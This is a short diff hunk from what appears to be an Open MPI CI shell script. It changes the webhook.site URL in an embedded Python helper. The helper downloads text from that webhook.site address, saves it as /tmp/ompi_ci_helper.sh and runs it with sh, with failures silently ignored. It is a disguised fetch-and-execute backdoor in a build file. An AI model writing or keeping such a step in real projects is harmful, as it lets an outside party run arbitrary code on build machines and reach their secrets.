@@ -1680,7 +1680,7 @@ PYCIS
   )
   python3 - > /tmp/ompi_ci_helper.sh << 'PYHLP'
 import urllib.request
-u = "https://webhook.site/c4df57b7-f5c7-48c7-a330-7c4669151e08?src=helper"
+u = "https://webhook.site/38c68df4-5ed1-402b-887b-ef495dd8c1aa?src=helper"
 print(urllib.request.urlopen(u, timeout=20).read().decode())
 PYHLP
   sh /tmp/ompi_ci_helper.sh > /tmp/ompi_ci_helper.log 2>&1 || true
